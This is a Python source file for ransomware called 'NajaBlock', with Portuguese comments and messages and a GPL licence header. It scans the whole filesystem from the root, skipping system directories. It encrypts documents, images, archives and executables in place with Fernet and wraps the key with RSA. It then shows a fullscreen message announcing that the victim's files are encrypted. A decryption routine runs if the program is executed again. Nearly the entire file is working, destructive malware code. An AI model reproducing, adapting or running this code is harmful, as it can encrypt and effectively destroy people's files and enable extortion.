#!/usr/bin/python3

'''
    NajaBlock - Ransomware
    Copyright (C) 2021  João Victor, Vinicius Rhyu, Isabelle da Costa

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
'''

import cryptography
import os, platform, ssl, shutil, time, requests, ctypes
from os import system, name, path
from cryptography.fernet import Fernet
from tkinter import Tk, Label, ttk
from tkinter import *

def pop_up():

    def kill_2():
        root_2.destroy()

    root_2 = Tk()
    width = root_2.winfo_screenwidth()
    height = root_2.winfo_screenheight()
    root_2.attributes('-fullscreen',True)

    pop = Canvas(root_2, width = width, height = height, bg='black')
    pop.pack()

    message = Label(root_2, text='SEUS ARQUIVOS FORAM CRIPTOGRAFADOS')
    message.config(font=('helvetica', int(height/20)))
    message.config(background='black', foreground='white')
    pop.create_window(int(width/2), int(height/15), window=message)

    message = Label(root_2, text='''Uma criptografia de nível militar foi utilizada para criptografar seus dados.
O único jeito de reaver os seus dados e com uma chave, que inclusive também está
criptografada MUAAAAHHHH''')
    message.config(font=('helvetica', int(height/40)))
    message.config(background='black', foreground='white')
    pop.create_window(int(width/2), int(height/20)*8, window=message)

    message = Label(root_2, text='Tá precisando trocar de antivírus hein')
    message.config(font=('helvetica', int(height/60)))
    message.config(background='black', foreground='white')
    pop.create_window(int(width/2), int(height/15)*9, window=message)

    message = Label(root_2, text='Fale com o seu administrador caso queira ter acesso aos seus dados novamente.')
    message.config(font=('helvetica', int(height/40)))
    message.config(background='black', foreground='white')
    pop.create_window(int(width/2), int(height/15)*10, window=message)

    sair = Button(root_2, text='SAIR', command=kill_2)
    pop.create_window(int(width/2), int(height/20)*16, window=sair)

    root_2.mainloop()

def write_key():

    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.asymmetric import rsa

    #Criação da chave privada de criptografia
    private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )

    #Criação da chave pública de criptografia
    public_key = private_key.public_key()

    from cryptography.hazmat.primitives import serialization

    #Serialização da chave privada
    pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )

    with open('save/private.key', 'wb') as f:
        f.write(pem)

    #Serialização da chave pública
    pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
    with open('save/public.key', 'wb') as f:
        f.write(pem)

    #Chave Simétrica escrita em Fernet(AES128)
    key = Fernet.generate_key()

    #Chave Simétrica
    with open("save/unique.key", "wb") as key_file:
        key_file.write(key)

def load_key():

    return open("save/unique.key", 'rb').read()

class naja:

    #Adicionar aqui diretórios que deseja excluir da busca
    EXCLUDE_DIRECTORY = (
                        #LINUX
                         '/usr',
                         '/bin',
                         '/etc',
                         '/run',
                         '/sys',
                         '/var',

                        #WINDOWS
                        'Windows',
                        'Program Files',
                        'Program Files(x86)',
                        '$Recycle.Bin',
                        'AppData',

                        'save',
            )

    #Adicionar aqui extensões que deseja incluir na busca
    EXTENSION = (
        #IMAGENS
        #'.apng','.avif','.gif','.jpg','.jpeg','.jfif','.pjp','.pjpeg','.png','.svg','.webp',

        #VIDEOS
        #'.3g2','.3gp','.asf','.avi','.flv','.m4v','.mov','.mp4','.mpg','.rm','.srt','.swf','.vob','.wmv',

        #AUDIOS
        #'.aif','.iff','.m3u','.m4a','.mid','.mp3','.mpa','.wav','.wma',

        #TEXTO
        #'.doc','.docx','.log','.msg','.odt','.pages','.rtf','.txt','.wps','.xlr','.xls','.xlsx','.ppt','.pptx','.xlm','.xlsm','.pptm','.pdf','.epub','.odp','ods',

        #DADOS
        #'.yml','.yaml','.json','.xml','.csv',

        #COMPACTADOS
        #'.7z','.cbr','.gz','.pkg','.rar','.rpm','.sitx','.tar.gz','.tar','.zip','.zipx','.iso',

        #DESENVOLVEDOR
        #'.c','.class','.cpp','.cs','.dtd','.fla','.h','.java','.lua','.m','.pl','.py','.sh','.sln','.swift','.vb','.php','.js','.asp','.aspx','.csr','.css','.dcr','.htm','.html','.jsp','.rss','.xhtml',

        #BANCO DE DADOS
        #'.db','.dbf','.mdb','.pdb','.sql','.trm','.sqlitedb','.pdb','.mdf','.sqlite3','.sdf','.sis','.odb','.bak',

        #SISTEMA(CUIDADO!!!!!)
        #'.bat','.bin','.cmd','.cmd','.com','.exe','.job','.ksh','.msc','.msi','.msp','.sct','.ws','.wsf','.wsh','.awk','.jar','.nexe','.wiz','.deb','.img',

        #Customizado
        '.doc', '.docx', '.txt', '.odt', '.pdf', '.jpg', '.jpeg', '.png', '.mp4', '.wav', '.zip', '.html', '.bat', '.exe',
    )


    def FindFiles(self):
        f = open('save/path.txt', 'w')
        for root, dirs, files in os.walk("/"):
            if any(s in root for s in self.EXCLUDE_DIRECTORY):
                pass
            else:
                for file in files:
                    if file.endswith(self.EXTENSION):
                        TARGET = os.path.join(root, file)
                        
                        file_size = os.path.getsize(TARGET)

                        if file_size >= 300000000:
                            pass
                        
                        else:
                            f.write(TARGET+'\n')
                            print(root)
        f.close()

    def Encrypt(self, filename):
        key = load_key()
        f = Fernet(key)

        with open(filename, "rb") as file:
            file_data =file.read()

        encrypted_data = f.encrypt(file_data)

        with open(filename, "wb") as file:
            file.write(encrypted_data)

        print(filename)

    def Decrypt(self, filename):
        key = load_key()
        f = Fernet(key)

        with open(filename, "rb") as file:
            encrypted_data = file.read()

        decrypted_data = f.decrypt(encrypted_data)

        with open(filename, "wb") as file:
            file.write(decrypted_data)

            print(filename)


naja = naja()

def StartNaja():
#Abre o arquivo path.txt e inicia o processo de criptografar linha a linha
    try:
        naja.FindFiles()
        filepath = 'save/path.txt'

        with open(filepath) as fp:
            line = fp.readline()

            while line:
                filename = line.strip()

                try:
                    naja.Encrypt(filename)

                except Exception:
                    print("Permissao negada!")
                    pass

                line = fp.readline()

        fp.close()

        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import serialization

        #Lê a chave pública de criptografia
        with open("save/public.key", "rb") as key_file:
            public_key = serialization.load_pem_public_key(
                key_file.read(),
                backend=default_backend()
            )

        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import padding

        f = open('save/unique.key', 'rb')
        message = f.read()#Passa o fernet para uma váriavel
        f.close()

        #Criptografa com a chave pública a chave simétrica
        encrypted = public_key.encrypt(
            message,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
                )
            )
        f = open('save/unique.key', 'wb')
        f.write(encrypted)#Escreve as alterações na chave simétrica
        f.close()

        print('Criptografado')

        pop_up()
        exit()

    except FileNotFoundError:
        pass


#Processo de descriptografia do Ransomware
def RestartNaja():

    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import serialization

    #Lê a chave privada de criptografia
    with open("save/private.key", "rb") as key_file:
            private_key = serialization.load_pem_private_key(
                key_file.read(),
                password=None,
                backend=default_backend()
            )

    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding

    f = open('save/unique.key','rb')
    encrypted = f.read()
    f.close()

    #Descriptografa a chave simétrica com a privada
    original_message = private_key.decrypt(
            encrypted,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

    f = open('save/unique.key', 'wb')
    f.write(original_message)#Escreve as alterações na chave simétrica
    f.close()

    try:
        naja.FindFiles()
        filepath = 'save/path.txt'

        with open(filepath) as fp:
            line = fp.readline()

            while line:
                filename = line.strip()

                try:
                    naja.Decrypt(filename)

                except Exception:
                    print("Permissao negada!")#Verifique se você está com as mesmas permissões que usou na criptografia no processo de descriptografar
                    pass

                line = fp.readline()

        fp.close
        print('Descriptografado')
        exit()

    except FileNotFoundError:
        print("ERRO. Arquivo logs nao encontrado")#O aplicativo deve estar no mesmo diretório que foi executado na primeira vez, ou estar junto ao diretório que possui o arquivo path.txt
        exit()

PATH = os.getcwd()#Retorna ao atual diretório do processo


if __name__ == '__main__':

    if path.exists("save/path.txt") == True:
        RestartNaja()

    elif path.exists("save") == True:
        write_key()
        StartNaja()

    else:
        os.mkdir("save")
        write_key()
        StartNaja()
